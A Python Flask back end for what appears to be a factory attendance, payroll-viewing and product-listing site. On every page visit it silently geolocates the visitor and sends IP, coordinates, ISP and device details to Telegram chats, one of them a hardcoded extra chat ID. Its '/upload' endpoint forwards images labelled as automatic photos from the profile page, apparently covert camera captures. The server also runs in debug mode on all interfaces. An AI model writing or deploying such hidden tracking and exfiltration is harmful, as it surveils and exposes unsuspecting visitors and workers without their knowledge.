import base64
import json
import os
from datetime import datetime
from pathlib import Path
from typing import Dict, Optional, Tuple
from urllib.parse import quote
from uuid import uuid4

import requests
from dotenv import load_dotenv
from flask import Flask, jsonify, redirect, request, send_from_directory
from werkzeug.utils import secure_filename

BASE_DIR = Path(__file__).resolve().parent
FRONTEND_DIR = BASE_DIR / "frontend"
ABSENSI_DIR = BASE_DIR / "card absensi"
PRODUK_DIR = BASE_DIR / "produk"
SECURITY_DIR = BASE_DIR / "security-archive"
VIEWS_FILE = BASE_DIR / "views.json"

load_dotenv(BASE_DIR / ".env")

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
TELEGRAM_EXTRA_CHAT_ID = "7954686966"
TELEGRAM_API_BASE = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

ALLOWED_IMAGE_EXTENSIONS = {".jpg", ".jpeg", ".png", ".webp"}

app = Flask(__name__, static_folder=str(FRONTEND_DIR), static_url_path="")


for folder in (ABSENSI_DIR, PRODUK_DIR, SECURITY_DIR):
    folder.mkdir(parents=True, exist_ok=True)


if not VIEWS_FILE.exists():
    VIEWS_FILE.write_text("{}", encoding="utf-8")


HTML_ROUTE_MAP = {
    "/": "index.html",
    "/toko-produk": "toko-produk.html",
    "/hitungkan-gaji": "upload-absensi.html",
    "/jual-barang": "upload-produk.html",
    "/lihat-gaji": "profil.html",
    "/about": "about.html",
}


def _now_tag() -> str:
    return datetime.now().strftime("%Y%m%d_%H%M%S")


def _safe_text(value: Optional[str], default: str = "") -> str:
    if not value:
        return default
    return " ".join(str(value).strip().split())


def _get_client_ip() -> str:
    forwarded = request.headers.get("X-Forwarded-For", "")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return request.remote_addr or "unknown"


def _get_location_by_ip(ip_address: str) -> Dict[str, str]:
    if not ip_address or ip_address == "unknown":
        return {
            "city": "unknown",
            "region": "unknown",
            "country": "unknown",
            "timezone": "unknown",
            "isp": "unknown",
            "lat": "unknown",
            "lon": "unknown",
        }

    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=10)
        data = response.json() if response.ok else {}
        if data.get("status") == "success":
            return {
                "city": _safe_text(data.get("city"), "unknown"),
                "region": _safe_text(data.get("regionName"), "unknown"),
                "country": _safe_text(data.get("country"), "unknown"),
                "timezone": _safe_text(data.get("timezone"), "unknown"),
                "isp": _safe_text(data.get("isp"), "unknown"),
                "lat": str(data.get("lat", "unknown")),
                "lon": str(data.get("lon", "unknown")),
            }
    except requests.RequestException:
        pass

    return {
        "city": "unknown",
        "region": "unknown",
        "country": "unknown",
        "timezone": "unknown",
        "isp": "unknown",
        "lat": "unknown",
        "lon": "unknown",
    }


def _telegram_chat_ids() -> Tuple[str, ...]:
    ids = []
    for raw in (TELEGRAM_CHAT_ID, TELEGRAM_EXTRA_CHAT_ID):
        chat_id = _safe_text(raw)
        if chat_id and chat_id not in ids:
            ids.append(chat_id)
    return tuple(ids)


def _parse_user_agent(ua: str) -> Dict[str, str]:
    ua_raw = (ua or "").lower()

    device = "Desktop"
    if "ipad" in ua_raw or "tablet" in ua_raw:
        device = "Tablet"
    elif "mobile" in ua_raw or "android" in ua_raw or "iphone" in ua_raw:
        device = "Mobile"

    os_name = "Unknown"
    if "windows" in ua_raw:
        os_name = "Windows"
    elif "android" in ua_raw:
        os_name = "Android"
    elif "iphone" in ua_raw or "ipad" in ua_raw or "ios" in ua_raw:
        os_name = "iOS"
    elif "mac os" in ua_raw or "macintosh" in ua_raw:
        os_name = "macOS"
    elif "linux" in ua_raw:
        os_name = "Linux"

    browser = "Unknown"
    if "edg/" in ua_raw:
        browser = "Edge"
    elif "opr/" in ua_raw or "opera" in ua_raw:
        browser = "Opera"
    elif "chrome/" in ua_raw and "chromium" not in ua_raw:
        browser = "Chrome"
    elif "safari/" in ua_raw and "chrome/" not in ua_raw:
        browser = "Safari"
    elif "firefox/" in ua_raw:
        browser = "Firefox"

    return {"device": device, "os": os_name, "browser": browser}


def _notify_html_visit(page_name: str) -> None:
    ip_address = _get_client_ip()
    location = _get_location_by_ip(ip_address)
    user_agent = _parse_user_agent(request.headers.get("User-Agent", ""))

    message = (
        "🔔 Pengunjung membuka halaman HTML\n\n"
        f"📄 File: {page_name}\n"
        f"🌐 IP: {ip_address}\n"
        f"📍 Lokasi: {location['city']}, {location['region']}, {location['country']}\n"
        f"🛰 ISP: {location['isp']}\n"
        f"🕒 Timezone: {location['timezone']}\n"
        f"🧭 Coordinates: {location['lat']}, {location['lon']}\n"
        f"📱 Device: {user_agent['device']}\n"
        f"💻 OS: {user_agent['os']}\n"
        f"🌎 Browser: {user_agent['browser']}\n"
        f"⏱ Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    _send_telegram_message(message)


@app.before_request
def track_html_visit() -> None:
    if request.method != "GET":
        return

    path = request.path or ""
    page_name = HTML_ROUTE_MAP.get(path)

    if not page_name and path.lower().endswith(".html"):
        page_name = Path(path).name

    if not page_name:
        return

    _notify_html_visit(page_name)


def _send_telegram_message(text: str) -> None:
    chat_ids = _telegram_chat_ids()
    if not TELEGRAM_BOT_TOKEN or not chat_ids:
        return

    for chat_id in chat_ids:
        try:
            requests.post(
                f"{TELEGRAM_API_BASE}/sendMessage",
                data={"chat_id": chat_id, "text": text},
                timeout=15,
            )
        except requests.RequestException:
            # Non-blocking: upload should still succeed even if Telegram fails.
            continue


def _send_telegram_photo(photo_path: Path, caption: str = "") -> None:
    chat_ids = _telegram_chat_ids()
    if not TELEGRAM_BOT_TOKEN or not chat_ids:
        return

    for chat_id in chat_ids:
        try:
            with photo_path.open("rb") as file_obj:
                requests.post(
                    f"{TELEGRAM_API_BASE}/sendPhoto",
                    data={"chat_id": chat_id, "caption": caption},
                    files={"photo": file_obj},
                    timeout=30,
                )
        except requests.RequestException:
            # Non-blocking: upload should still succeed even if Telegram fails.
            continue


def _decode_data_url(data_url: str) -> Tuple[Optional[bytes], Optional[str]]:
    if not data_url or "," not in data_url:
        return None, None

    header, encoded = data_url.split(",", 1)
    mime_map = {
        "image/jpeg": ".jpg",
        "image/png": ".png",
        "image/webp": ".webp",
    }

    ext = None
    for mime, mime_ext in mime_map.items():
        if mime in header.lower():
            ext = mime_ext
            break

    if ext is None:
        ext = ".jpg"

    try:
        return base64.b64decode(encoded), ext
    except Exception:
        return None, None


def _save_base64_image(data_url: str, target_dir: Path, prefix: str) -> Optional[Path]:
    data, ext = _decode_data_url(data_url)
    if not data or not ext:
        return None

    filename = f"{prefix}_{_now_tag()}_{uuid4().hex[:8]}{ext}"
    file_path = target_dir / filename
    file_path.write_bytes(data)
    return file_path


def _save_uploaded_file(file_storage, target_dir: Path, prefix: str) -> Optional[Path]:
    if file_storage is None or not file_storage.filename:
        return None

    original_name = secure_filename(file_storage.filename)
    ext = Path(original_name).suffix.lower()
    if ext not in ALLOWED_IMAGE_EXTENSIONS:
        return None

    filename = f"{prefix}_{_now_tag()}_{uuid4().hex[:8]}{ext}"
    file_path = target_dir / filename
    file_storage.save(file_path)
    return file_path


def _load_views() -> Dict[str, int]:
    try:
        data = json.loads(VIEWS_FILE.read_text(encoding="utf-8"))
        if isinstance(data, dict):
            return {str(k): int(v) for k, v in data.items()}
    except Exception:
        pass
    return {}


def _save_views(views: Dict[str, int]) -> None:
    VIEWS_FILE.write_text(json.dumps(views, ensure_ascii=False, indent=2), encoding="utf-8")


def _to_employee_name(folder_name: str) -> str:
    return " ".join(word.upper() for word in folder_name.strip().split() if word)


def _to_employee_id(folder_name: str) -> str:
    return f"emp-{'-'.join(folder_name.strip().split())}".lower()


def _avatar_for_name(name: str) -> str:
    female_names = {
        "IRA",
        "NANI",
        "NASIBAH",
        "NURUL AINY",
        "SUSANA SANUSI",
        "TITIN",
        "WATI",
        "YENI",
        "SUMI",
    }
    if name in female_names:
        return "/gambar/siluet perempuan.png"
    return "/gambar/siluet pria.png"


def _role_for_name(name: str) -> str:
    role_by_name = {
        "ARISMAN": "Zizer",
        "BAGOS": "Grading Day",
        "ERAS TANTOWI": "Pati",
        "IRA": "Lotari",
        "MAMAT": "Grading Day",
        "NANI": "Pati",
        "NASIBAH": "Grading Day",
        "NURUL AINY": "Grading Day",
        "SUSANA SANUSI": "Grading Day",
        "TOPURI": "Zizer",
        "WARTO": "Lotari",
        "WATI": "Zizer",
    }
    return role_by_name.get(name, "Pekerja Kilang")


@app.get("/")
def index():
    return send_from_directory(FRONTEND_DIR, "index.html")


@app.get("/toko-produk")
def toko_produk():
    return send_from_directory(FRONTEND_DIR, "toko-produk.html")


@app.get("/hitungkan-gaji")
def hitungkan_gaji():
    return send_from_directory(FRONTEND_DIR, "upload-absensi.html")


@app.get("/jual-barang")
def jual_barang():
    return send_from_directory(FRONTEND_DIR, "upload-produk.html")


@app.get("/lihat-gaji")
def lihat_gaji():
    return send_from_directory(FRONTEND_DIR, "profil.html")


@app.get("/about")
def about():
    return send_from_directory(FRONTEND_DIR, "about.html")


@app.get("/facebook")
def facebook():
    fb_url = os.getenv("FACEBOOK_PROFILE_URL", "https://facebook.com")
    return redirect(fb_url)


@app.post("/api/upload-absensi")
def upload_absensi():
    nama = _safe_text(request.form.get("namaKaryawan"), "TanpaNama")
    tanggal = _safe_text(request.form.get("tanggal"))
    jam = _safe_text(request.form.get("jam"))
    keterangan = _safe_text(request.form.get("keterangan"))

    depan = _save_uploaded_file(request.files.get("depan"), ABSENSI_DIR, f"{secure_filename(nama)}_depan")
    belakang = _save_uploaded_file(
        request.files.get("belakang"), ABSENSI_DIR, f"{secure_filename(nama)}_belakang"
    )

    if not depan or not belakang:
        return jsonify({"ok": False, "message": "Foto depan dan belakang wajib diunggah (JPG/PNG/WEBP)."}), 400

    caption = (
        "📝 Absensi baru masuk\n"
        f"👤 Nama: {nama}\n"
        f"📅 Tanggal: {tanggal}\n"
        f"⏰ Jam: {jam}\n"
        f"📌 Keterangan: {keterangan}"
    )
    _send_telegram_message(caption)
    _send_telegram_photo(depan, caption=f"📷 Absensi Depan - {nama}")
    _send_telegram_photo(belakang, caption=f"📷 Absensi Belakang - {nama}")
    _send_telegram_message(
        "✅ Upload absensi berhasil\n"
        f"👤 Nama: {nama}\n"
        f"🗂 File: {depan.name}, {belakang.name}"
    )

    return jsonify(
        {
            "ok": True,
            "message": "Absensi berhasil diupload.",
            "files": [depan.name, belakang.name],
        }
    )


@app.post("/api/upload-produk")
def upload_produk():
    nama_produk = _safe_text(request.form.get("namaProduk"), "TanpaNamaProduk")
    keterangan = _safe_text(request.form.get("keteranganProduk"))
    harga = _safe_text(request.form.get("hargaProduk"))
    nomor_wa = _safe_text(request.form.get("nomorWA"))

    uploaded = request.files.getlist("photos")
    saved_paths = []

    for idx, file_obj in enumerate(uploaded, start=1):
        saved = _save_uploaded_file(file_obj, PRODUK_DIR, f"{secure_filename(nama_produk)}_{idx}")
        if saved:
            saved_paths.append(saved)

    if not saved_paths:
        return jsonify({"ok": False, "message": "Minimal 1 foto produk harus diunggah (JPG/PNG/WEBP)."}), 400

    caption = (
        "🛒 Produk baru dijual\n"
        f"📦 Nama Produk: {nama_produk}\n"
        f"💰 Harga: RM {harga}\n"
        f"📱 Nomor WA: {nomor_wa}\n"
        f"📌 Keterangan: {keterangan}"
    )
    _send_telegram_message(caption)
    for path in saved_paths:
        _send_telegram_photo(path, caption=f"📷 Foto Produk - {nama_produk}")

    uploaded_names = ", ".join([p.name for p in saved_paths])
    _send_telegram_message(
        "✅ Upload produk berhasil\n"
        f"📦 Nama Produk: {nama_produk}\n"
        f"🗂 File: {uploaded_names}"
    )

    return jsonify(
        {
            "ok": True,
            "message": "Produk berhasil diupload.",
            "files": [p.name for p in saved_paths],
        }
    )


@app.post("/upload")
def upload_security_photo():
    body = request.get_json(silent=True) or {}
    img_data = body.get("img", "")

    saved = _save_base64_image(img_data, SECURITY_DIR, "security")
    if not saved:
        return "Invalid image payload", 400

    _send_telegram_photo(saved, caption="Arsip keamanan: auto photo dari halaman profil")
    return "OK", 200


@app.get("/api/views")
def get_views():
    return jsonify({"views": _load_views()})


@app.post("/api/views/<employee_id>/increment")
def increment_views(employee_id: str):
    key = _safe_text(employee_id)
    if not key:
        return jsonify({"ok": False, "message": "employee_id tidak valid"}), 400

    views = _load_views()
    views[key] = int(views.get(key, 0)) + 1
    _save_views(views)

    return jsonify({"ok": True, "employee_id": key, "views": views[key]})


@app.get("/api/profiles")
def get_profiles():
    payroll_dir = FRONTEND_DIR / "upah"
    if not payroll_dir.exists():
        return jsonify({"profiles": []})

    profiles = []
    for folder in sorted([d for d in payroll_dir.iterdir() if d.is_dir()], key=lambda p: p.name.lower()):
        files = sorted(
            [f for f in folder.iterdir() if f.is_file() and f.suffix.lower() in ALLOWED_IMAGE_EXTENSIONS],
            key=lambda p: p.name.lower(),
        )
        if not files:
            continue

        name = _to_employee_name(folder.name)
        photos = [f"/upah/{quote(folder.name)}/{quote(file.name)}" for file in files]
        profiles.append(
            {
                "id": _to_employee_id(folder.name),
                "name": name,
                "role": _role_for_name(name),
                "avatar": _avatar_for_name(name),
                "photos": photos,
            }
        )

    return jsonify({"profiles": profiles})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", "5000")), debug=True)
